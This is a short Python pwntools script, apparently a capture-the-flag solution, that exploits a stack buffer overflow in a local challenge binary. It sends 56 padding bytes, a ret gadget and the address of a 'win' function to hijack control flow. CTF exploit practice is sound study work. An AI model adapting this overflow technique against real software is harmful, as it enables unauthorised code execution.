from pathlib import Path
from pwn import *
ctx=Path(__file__).resolve().parents[1]/"challenge/chall"
context.binary=elf=ELF(str(ctx),checksec=False)
rop=ROP(elf)
ret=rop.find_gadget(["ret"])[0]
p=process(elf.path)
p.recvuntil(b"input:")
p.sendline(b"A"*56+p64(ret)+p64(elf.symbols["win"]))
print(p.recvall(timeout=2).decode(errors="replace"))
